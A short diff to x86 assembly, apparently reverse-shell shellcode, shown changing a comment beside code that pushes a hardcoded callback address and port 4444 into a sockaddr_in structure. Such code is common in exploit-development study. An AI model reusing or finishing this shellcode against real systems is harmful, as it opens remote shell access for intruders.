@@ -18,7 +18,7 @@ _start:
 
 ; populate the sockaddr_in structure with our settings
  inc bl                ; increment bl to 2 to use in our structure
-; 192.168.99.128 is the hardcoded address here this needs to be little endian
+; \x80\x58\xa8\xc0
  push dword 0x8058a8c0
  push word 0x5c11      ; sin_port, it has to be in big endian. port = 4444
  push word bx          ; sin_family, 0x2 is AF_INET
